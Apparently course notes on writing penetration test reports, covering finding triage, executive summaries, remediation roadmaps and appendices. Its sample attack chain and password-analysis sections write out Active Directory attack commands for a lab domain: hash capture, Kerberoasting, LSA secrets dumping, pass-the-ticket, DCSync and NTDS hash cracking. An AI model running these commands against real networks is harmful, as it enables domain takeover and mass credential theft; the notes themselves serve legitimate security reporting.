## Components of a Report

The report is the single deliverable that justifies every hour of the engagement. Everything in it must earn its place, from the attack chain to the appendices. 

***

## Prioritising Findings During an Assessment

One of the practical skills the module addresses before even discussing report structure is learning to filter signal from noise during testing itself. 

```
The noise problem:
  Large assessments produce enormous amounts of data.
  Vulnerability scanners will return hundreds of results.
  Many will be false positives, informational, or non-exploitable.

How to handle it:
  Focus time on high-impact findings first:
    RCE, sensitive data exposure, authentication bypass, domain compromise
  Do not spend hours validating a finding you cannot exploit in any meaningful way.
  For clusters of minor issues (e.g., 35 TLS variations, dozens of DoS CVEs
  on an EOL PHP version), consolidate into a category finding:
    "Multiple SSL/TLS configuration weaknesses were observed across X hosts.
     While none were directly exploitable in the context of this assessment,
     they indicate a gap in baseline configuration standards."

Avoid rabbit holes:
  Time-boxed assessments have no room for chasing broken PoCs.
  If you are stuck on a finding after a reasonable effort, ask a senior colleague.
  Something you spend half a day on may take them five minutes to confirm
  as a false positive or a dead end.
  Build a team culture where asking for help is encouraged, not stigmatised.
```

***

## Writing the Attack Chain

The attack chain is the most impactful section for demonstrating cumulative risk. It shows not just that individual findings exist, but that they chain together to produce total domain compromise. 

```
Structure:

1. One-paragraph summary at the top
   Plain-language overview of the full path taken.
   No technical jargon. The summary should make sense to a non-technical reader.

2. Numbered steps with evidence for each
   Each step: what was done, why it was possible, what it gave you.
   Include command output and screenshots inline.
   These can be directly reused as evidence for individual findings,
   so format them well here and copy-paste later.

Sample attack chain walkthrough - INLANEFREIGHT.LOCAL:

Step 1: NTLMv2 hash capture via Responder
  Tool: Responder -I eth0 -wrfv
  Result: NTLMv2 hash captured for domain user bsmith
  Why possible: LLMNR/NBT-NS enabled on the network (no dedicated DNS)

Step 2: Offline hash cracking
  Tool: hashcat -m 5600 bsmith_hash /usr/share/wordlists/rockyou.txt
  Result: Cleartext password recovered for bsmith
  Why possible: Weak password that appears in rockyou.txt wordlist

Step 3: BloodHound enumeration as bsmith
  Tool: bloodhound-python -u bsmith -p <REDACTED> -d inlanefreight.local -c All
  Result: Domain mapped. mssqlsvc identified as Kerberoastable with admin
          rights over SQL01.

Step 4: Kerberoasting mssqlsvc
  Tool: GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -request-user mssqlsvc
  Result: TGS ticket obtained, cracked offline with hashcat -m 13100
  Why possible: Service account configured with SPN, weak password set

Step 5: LSA secrets dump on SQL01
  Tool: crackmapexec smb SQL01 -u mssqlsvc -p <REDACTED> --lsa
  Result: Cleartext credentials for srvadmin retrieved from registry
  Why possible: Auto-logon credentials stored in LSA secrets

Step 6: RDP to MS01 as srvadmin, find pramirez logged in
  Tool: query user on MS01
  Result: pramirez active session with krbtgt ticket in memory
  BloodHound confirmed: pramirez has GetChanges + GetChangesAll on domain object

Step 7: Pass-the-Ticket as pramirez
  Tool: Rubeus dump /luid:0x1a8b19 /service:krbtgt
        Rubeus ptt /ticket:<base64>
  Result: Authenticated session as pramirez, confirmed with klist

Step 8: DCSync -> Domain Compromise
  Tool: mimikatz lsadump::dcsync /user:INLANEFREIGHT\administrator
  Result: Administrator NTLM hash retrieved
  Confirmed: crackmapexec smb DC01 -u administrator -H <hash> -> Pwn3d!

Step 9: Full domain credential dump
  Tool: secretsdump.py with Administrator hash -just-dc-ntlm
  Result: All domain hashes retrieved. Domain fully compromised.

Break-the-chain note (include this in the report):
  Fixing Step 1 alone (disable LLMNR/NBT-NS): breaks chain at the start.
  Fixing Step 4 alone (strong service account passwords): hash uncrackable.
  Fixing Step 5 alone (remove LSA autologon creds): no pivot to srvadmin.
  Fixing Step 6 alone (pramirez DCSync rights): no replication attack possible.
  All four findings must be remediated. Fixing one is progress but not sufficient.
```

***

## Writing a Strong Executive Summary

The executive summary is the section most likely to drive budget decisions and remediation prioritisation. If it fails, everything else in the report risks being ignored. 

```
Core assumptions to make while writing:
  - The reader has no technical background whatsoever
  - This may be the first penetration test report they have ever read
  - Their attention span is limited - lose it and you will not get it back
  - They may use this report to justify budget requests to the board
  - They will not open the technical sections

Length: 1.5 to 2 pages maximum.

Do:
  Use specific numbers:
    "Seven (7) findings" not "several findings"
    "Five (5) high-risk" not "multiple high-risk"
    If you might have missed one, hedge: "during the time allotted,
    we observed at least 25 instances of X"

  Describe what was accessed, not what was exploited:
    Bad:   "Domain Admin obtained via DCSync"
    Good:  "Access was obtained to an account that enabled retrieval of
            credentials for all company user accounts, including HR,
            finance, and executive-level staff"

  Describe process failures, not just technical symptoms:
    "The underlying issue is not the specific weak password but the
     absence of a policy that prevents users from setting one"

  Acknowledge what the client did well:
    "No findings in this report were related to missing patches,
     indicating a mature patch management process."
    This builds trust and makes the critical findings land harder.

  Give remediation effort context if you have the experience:
    "Some of these issues require simple configuration changes that
     can be made quickly, while others will require process changes
     that take time to implement organisation-wide."

Do not:
  Use acronyms: NTLMv2, LLMNR, TGS, CVSS, RCE, MitM
  Name tools:  Mimikatz, Responder, BloodHound, Rubeus, CrackMapExec
  Name protocols: Kerberos, LDAP, SMB, NBT-NS
  Reference technical sections: "As described in finding H-03..."
  Use technical severity labels without plain-language translation
  Recommend specific vendors by name

Vocabulary translations for executive summary writing:
  Technical term          Plain-language alternative
  ----------------------  -----------------------------------------
  LLMNR/NBT-NS spoofing   A network communication protocol that can
                          be abused to steal user passwords
  Kerberoasting           A technique that exploits how the network
                          authenticates service accounts to recover passwords
  Pass-the-ticket         Using a stolen authentication token to
                          impersonate another user
  DCSync                  Mimicking a domain controller to extract
                          every user's password from the central directory
  Hash cracking           Converting a scrambled form of a password
                          back to its readable form
  Password spraying       Attempting one commonly used password against
                          a large number of user accounts simultaneously
  Domain Admin            An account with unrestricted access to all
                          systems and data across the entire network
  LSA secrets             Sensitive credentials stored on a server
                          in a format that can be decoded
```

***

## Summary of Recommendations

A structured remediation roadmap prevents the client from asking "where do we start?" and gives them a concrete, prioritised action plan. 
```
Three time horizons:

Near-term (0-30 days):
  Actionable, specific, directly tied to confirmed findings.
  These are the fires. Address them first.
  Example:
    "Disable LLMNR and NBT-NS via Group Policy (Finding H-01)"
    "Rotate all compromised credentials identified during testing"
    "Remove auto-logon credentials from SQL01 registry (Finding H-03)"

Medium-term (30-90 days):
  Process changes and security control implementations.
  Require more planning but have a clear path.
  Example:
    "Implement a service account password policy requiring 25+ character
     random passwords managed by a privileged access management (PAM) tool"
    "Enable SMB signing via GPO across all domain hosts"
    "Deploy MFA for all privileged and remote-access accounts"

Long-term (90+ days):
  Programme-level maturity improvements.
  May not map to a single finding.
  Example:
    "Establish a configuration management baseline using CIS Benchmarks
     and enforce it via GPO before new systems enter production"
    "Implement periodic internal vulnerability scanning"
    "Conduct annual penetration tests with targeted AD security assessments"

Tie each recommendation back to a specific finding ID.
If you have 20 findings, do not list 20 individual recommendations.
Collapse findings that share a root cause into one recommendation.
"Weak service account passwords (H-02, H-04, H-05) all indicate the
 absence of a privileged account management policy."
```

***

## Appendices Reference

| Appendix | Appears In | Contents |
|---|---|---|
| Scope | All reports | In-scope IP ranges, URLs, systems |
| Methodology | All reports | Repeatable testing process description |
| Severity ratings | All reports | Definitions and criteria for each level |
| Biographies | PCI-DSS assessments | Tester qualifications to satisfy compliance |
| Exploitation attempts and payloads | All pentests | Tools used, payloads deployed, file hashes, cleanup status |
| Compromised credentials | Internal pentest | Accounts compromised (or "all domain accounts" if full dump) |
| Configuration changes | All pentests | Every system change made, with revert status |
| Additional affected scope | Large scope findings | Overflow host lists too long for the finding itself |
| Information gathering / OSINT | External pentest | Whois, subdomains, emails, breach data, SSL analysis |
| Domain password analysis | Internal if NTDS dumped | Hash count, cracked count, privileged accounts cracked, top passwords, DPAT report |

***

## Domain Password Analysis

If you achieve domain compromise and dump the NTDS database, a password analysis appendix adds significant evidence for weak password findings and policy recommendations. 
```
Process:
  1. Dump NTDS:
     secretsdump.py admin@DC01 -hashes :ntlmhash -just-dc-ntlm > ntds.txt

  2. Crack with multiple passes:
     hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt
     hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
     hashcat -m 1000 ntds.txt company_specific_wordlist.txt
     # Brute force up to 8 characters if hardware allows:
     hashcat -m 1000 ntds.txt -a 3 ?a?a?a?a?a?a?a?a

  3. Analyse with DPAT (Domain Password Audit Tool):
     dpat.py -n ntds.txt -c cracked.txt -g "Domain Admins.txt"
     # Produces HTML report with stats

  Key statistics to include in the appendix:
    - Total hashes obtained: X
    - Total hashes cracked: X (Y%)
    - Privileged accounts cracked (Domain Admins, Enterprise Admins): X
    - Top 10 most common passwords
    - Password length distribution
    - Number of accounts sharing the same password as another account

  This data directly supports executive summary language about
  weak passwords and the need for a password policy.
```
